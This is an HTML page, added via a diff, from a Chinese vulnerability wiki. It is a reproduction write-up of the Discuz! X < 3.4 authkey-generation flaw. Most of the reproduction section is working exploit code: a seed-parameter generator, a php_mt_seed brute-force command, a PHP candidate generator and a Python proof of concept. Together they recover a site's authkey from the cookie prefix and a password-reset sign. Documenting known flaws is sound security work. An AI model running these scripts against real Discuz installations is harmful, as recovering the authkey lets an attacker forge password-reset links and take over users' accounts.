@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%20X%20_%203.4%20authkey%20%E7%AE%97%E6%B3%95%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Discuz! X \&lt; 3.4 authkey 算法的安全性漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Discuz! X \\\u0026lt; 3.4 authkey \u7b97\u6cd5\u7684\u5b89\u5168\u6027\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_5" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X%20_%203.4%20uc_center%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X%20_%203.4%20uc_center%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X \&lt; 3.4 uc_center 后台代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X%20Windows%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AF%BC%E8%87%B4%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X%20Windows%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AF%BC%E8%87%B4%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/" class="btn btn-xs btn-link">
+        Discuz! X Windows短文件名安全问题导致的数据库备份爆破
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="discuz-x-34-authkey">Discuz! X \&lt; 3.4 authkey 算法的安全性漏洞<a class="headerlink" href="#discuz-x-34-authkey" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>2017年8月1日，Discuz!发布了X3.4版本，此次更新中修复了authkey生成算法的安全性漏洞，通过authkey安全性漏洞，我们可以获得authkey。系统中逻辑大量使用authkey以及authcode算法，通过该漏洞可导致一系列安全问题：邮箱校验的hash参数被破解，导致任意用户绑定邮箱可被修改等...</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>php&gt;5.3+php-curl\&lt;=7.54</p>
+<ul>
+<li>
+<p>Discuz_X3.3_SC_GBK</p>
+</li>
+<li>
+<p>Discuz_X3.3_SC_UTF8</p>
+</li>
+<li>
+<p>Discuz_X3.3_TC_BIG5</p>
+</li>
+<li>
+<p>Discuz_X3.3_TC_UTF8</p>
+</li>
+<li>
+<p>Discuz_X3.2_SC_GBK</p>
+</li>
+<li>
+<p>Discuz_X3.2_SC_UTF8</p>
+</li>
+<li>
+<p>Discuz_X3.2_TC_BIG5</p>
+</li>
+<li>
+<p>Discuz_X3.2_TC_UTF8</p>
+</li>
+<li>
+<p>Discuz_X2.5_SC_GBK</p>
+</li>
+<li>
+<p>Discuz_X2.5_SC_UTF8</p>
+</li>
+<li>
+<p>Discuz_X2.5_TC_BIG5</p>
+</li>
+<li>
+<p>Discuz_X2.5_TC_UTF8</p>
+</li>
+</ul>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>在dz3.3/upload/install/index.php 346行</p>
+<p><img alt="" src="./resource/Discuz!X&lt;3.4authkey算法的安全性漏洞/media/rId25.png" /></p>
+<p>我们看到authkey是由多个参数的md5前6位加上random生成的10位产生的。</p>
+<p>跟入random函数</p>
+<p><img alt="" src="./resource/Discuz!X&lt;3.4authkey算法的安全性漏洞/media/rId26.png" /></p>
+<p>当php版本大于4.2.0时，随机数种子不会改变</p>
+<p>我们可以看到在生成authkey之后，使用random函数生成了4位cookie前缀</p>
+<div class="codehilite"><pre><span></span><code>$_config[&#39;cookie&#39;][&#39;cookiepre&#39;] = random(4).&#39;_&#39;;
+</code></pre></div>
+
+<p>那么这4位cookie前缀就是我们可以得到的，那我们就可以使用字符集加上4位已知字符，爆破随机数种子。</p>
+<p>首先我们需要先获得4位字符</p>
+<p><img alt="" src="./resource/Discuz!X&lt;3.4authkey算法的安全性漏洞/media/rId27.png" /></p>
+<blockquote>
+<p>如上图所示，前四位是**sW7c**</p>
+</blockquote>
+<p>然后通过脚本生成用于php_mt_seed的参数</p>
+<blockquote>
+<p>这里需要修改第13行代码，替换你自己的cookie前四位</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="gh">#</span> coding=utf-8
+w_len = 10
+result = &quot;&quot;
+str_list = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&quot;
+length = len(str_list)
+for i in xrange(w_len):
+    result+=&quot;0 &quot;
+    result+=str(length-1)
+    result+=&quot; &quot;
+    result+=&quot;0 &quot;
+    result+=str(length-1)
+    result+=&quot; &quot;
+sstr = &quot;sW7c&quot;
+for i in sstr:
+    result+=str(str_list.index(i))
+    result+=&quot; &quot;
+    result+=str(str_list.index(i))
+    result+=&quot; &quot;
+    result+=&quot;0 &quot;
+    result+=str(length-1)
+    result+=&quot; &quot;
+print result
+</code></pre></div>
+
+<p>得到参数,使用php_mt_seed脚本</p>
+<p><a href="https://github.com/ianxtianxt/php-mt">https://github.com/ianxtianxt/php-mt</a>_rand</p>
+<div class="codehilite"><pre><span></span><code>./php_mt_seed 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 0 61 54 54 0 61 22 22 0 61 33 33 0 61 38 38 0 61 &gt; result.txt
+</code></pre></div>
+
+<p>这里我获得了245组种子</p>
+<p>接下来我们需要使用这245组随机数种子生成随机字符串</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">random</span><span class="p">(</span><span class="nv">$length</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$hash</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="nv">$chars</span> <span class="o">=</span> <span class="s1">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#39;</span><span class="p">;</span>
+    <span class="nv">$max</span> <span class="o">=</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">PHP_VERSION</span> <span class="o">&lt;</span> <span class="s1">&#39;4.2.0&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">mt_srand</span><span class="p">((</span><span class="nx">double</span><span class="p">)</span><span class="nb">microtime</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000000</span><span class="p">);</span>
+    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$length</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$hash</span> <span class="o">.=</span> <span class="nv">$chars</span><span class="p">[</span><span class="nb">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nv">$max</span><span class="p">)];</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nv">$hash</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;result.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">);</span>
+<span class="nv">$fp2</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">&#39;result2.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">);</span>
+<span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">)){</span>
+    <span class="nv">$b</span> <span class="o">=</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="mi">4096</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/seed = (\d)+/&quot;</span><span class="p">,</span> <span class="nv">$b</span><span class="p">,</span> <span class="nv">$matach</span><span class="p">)){</span>
+        <span class="nv">$m</span> <span class="o">=</span> <span class="nv">$matach</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+        <span class="k">continue</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="c1">// var_dump(substr($m,7));</span>
+    <span class="nb">mt_srand</span><span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$m</span><span class="p">,</span><span class="mi">7</span><span class="p">));</span>
+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fp2</span><span class="p">,</span> <span class="nx">random</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp2</span><span class="p">);</span>
+</code></pre></div>
+
+<p>当我们获得了所有的后缀时，我们需要配合爆破6位字符（0-9a-f）来验证authkey的正确性,由于的数量差不多16**6*200+,为了在有限的时间内爆破出来，我们需要使用一个本地爆破的方式。</p>
+<p>这里使用了找回密码中的id和sign参数，让我们一起来看看逻辑。</p>
+<p>当我们点击忘记密码的时候。</p>
+<p>会进入<code>/source/module/member/member_lostpasswd.php</code>
+65行生成用于验证的sign值。</p>
+<p><img alt="" src="./resource/Discuz!X&lt;3.4authkey算法的安全性漏洞/media/rId28.png" /></p>
+<p>跟随make_getpws_sign函数进入<code>/source/function/function_member.php</code></p>
+<p><img alt="" src="./resource/Discuz!X&lt;3.4authkey算法的安全性漏洞/media/rId29.png" /></p>
+<p>然后进入dsign函数，配合authkey生成结果</p>
+<p><img alt="" src="./resource/Discuz!X&lt;3.4authkey算法的安全性漏洞/media/rId30.png" /></p>
+<p>这里我们可以用python模拟这个过程，然后通过找回密码获得uid、id、sign，爆破判断结果。</p>
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><a href="http://www.0-sec.org/dz3.3/member?mod=getpasswd&amp;uid=2&amp;id=vnY6nW&amp;sign=af3b937d0132a06b">http://www.0-sec.org/dz3.3/member?mod=getpasswd&amp;uid=2&amp;id=vnY6nW&amp;sign=af3b937d0132a06b</a></p>
+<p>自行修改第7,8,13行代码</p>
+</blockquote>
+<div class="codehilite"><pre><span></span><code><span class="c1"># coding=utf-8</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">itertools</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">dsign</span><span class="p">(</span><span class="n">authkey</span><span class="p">):</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1/dz3.3/&quot;</span>
+    <span class="n">idstring</span> <span class="o">=</span> <span class="s2">&quot;vnY6nW&quot;</span>
+    <span class="n">uid</span> <span class="o">=</span> <span class="mi">2</span>
+    <span class="n">uurl</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">{}</span><span class="s2">member.php?mod=getpasswd&amp;uid=</span><span class="si">{}</span><span class="s2">&amp;id=</span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">idstring</span><span class="p">)</span>
+    <span class="n">url_md5</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">uurl</span><span class="o">+</span><span class="n">authkey</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">url_md5</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">16</span><span class="p">]</span>
+<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
+    <span class="n">sign</span> <span class="o">=</span> <span class="s2">&quot;af3b937d0132a06b&quot;</span>
+    <span class="n">str_list</span> <span class="o">=</span> <span class="s2">&quot;0123456789abcdef&quot;</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;result2.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">ranlist</span> <span class="o">=</span> <span class="p">[</span><span class="n">s</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">f</span><span class="p">]</span>
+    <span class="n">s_list</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">ranlist</span><span class="p">),</span> <span class="n">key</span><span class="o">=</span><span class="n">ranlist</span><span class="o">.</span><span class="n">index</span><span class="p">)</span>
+    <span class="n">r_list</span> <span class="o">=</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">str_list</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="mi">6</span><span class="p">)</span>
+    <span class="nb">print</span> <span class="s2">&quot;[!] start running....&quot;</span>
+    <span class="n">s_time</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">r_list</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">s</span> <span class="ow">in</span> <span class="n">s_list</span><span class="p">:</span>
+            <span class="n">prefix</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">j</span><span class="p">)</span>
+            <span class="n">authkey</span> <span class="o">=</span> <span class="n">prefix</span> <span class="o">+</span> <span class="n">s</span>
+            <span class="c1"># print dsign(authkey)</span>
+            <span class="k">if</span> <span class="n">dsign</span><span class="p">(</span><span class="n">authkey</span><span class="p">)</span> <span class="o">==</span> <span class="n">sign</span><span class="p">:</span>
+                <span class="nb">print</span> <span class="s2">&quot;[*] found used time: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">s_time</span><span class="p">)</span>
+                <span class="k">return</span> <span class="s2">&quot;[*] authkey found: &quot;</span> <span class="o">+</span> <span class="n">authkey</span>
+<span class="nb">print</span> <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+
+<p><img alt="" src="./resource/Discuz!X&lt;3.4authkey算法的安全性漏洞/media/rId32.png" /></p>
+<p><img alt="" src="./resource/Discuz!X&lt;3.4authkey算法的安全性漏洞/media/rId33.png" /></p>
+<h2 id="_5">参考链接<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://lorexxar.cn/2017/08/31/dz-authkey/">https://lorexxar.cn/2017/08/31/dz-authkey/</a>#%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X%20_%203.4%20uc_center%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X%20_%203.4%20uc_center%20%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Discuz! X \&lt; 3.4 uc_center 后台代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X%20Windows%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AF%BC%E8%87%B4%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X%20Windows%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E5%AF%BC%E8%87%B4%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%87%E4%BB%BD%E7%88%86%E7%A0%B4/" class="btn btn-xs btn-link">
+        Discuz! X Windows短文件名安全问题导致的数据库备份爆破
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
